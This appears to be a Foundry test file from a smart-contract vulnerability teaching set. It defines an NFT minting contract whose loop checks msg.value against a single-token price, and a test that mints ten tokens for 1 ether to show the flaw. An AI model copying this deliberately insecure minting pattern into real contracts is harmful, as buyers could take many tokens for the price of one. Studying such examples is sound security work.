pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract ContractTest is Test {
    HerRealmcoin HerRealmcoinContract;

    function testSafeCraftgear() public {
        HerRealmcoinContract = new HerRealmcoin();

        HerRealmcoinContract.safeCraftgear{value: 1 ether}(address(this), 10);
        console.log(
            "Due to incorrect check msg.value, we can mint many NFTs with 1 Eth."
        );
        console.log("NFT minted:", HerRealmcoinContract.itemcountOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {

        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract HerRealmcoin is ERC721, Ownable, Test {
    uint128 constant forgeweapon_price = 1 ether;
    uint128 constant MAX_SUPPLY = 10000;
    uint craftgearIndex;
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;

    constructor() payable ERC721("HarToken", "HRT") {}

    function safeCraftgear(address to, uint256 amount) public payable {
        require(
            _tokenIdCounter.current() + amount < MAX_SUPPLY,
            "Cannot mint given amount."
        );
        require(amount > 0, "Must give a mint amount.");


        for (uint256 i = 0; i < amount; i++) {
            require(msg.value >= forgeweapon_price, "Insufficient Ether.");

            craftgearIndex = _tokenIdCounter.current();
            console.log("mintIndex", craftgearIndex);
            _safeMint(to, craftgearIndex);
            _tokenIdCounter.increment();
        }
    }
}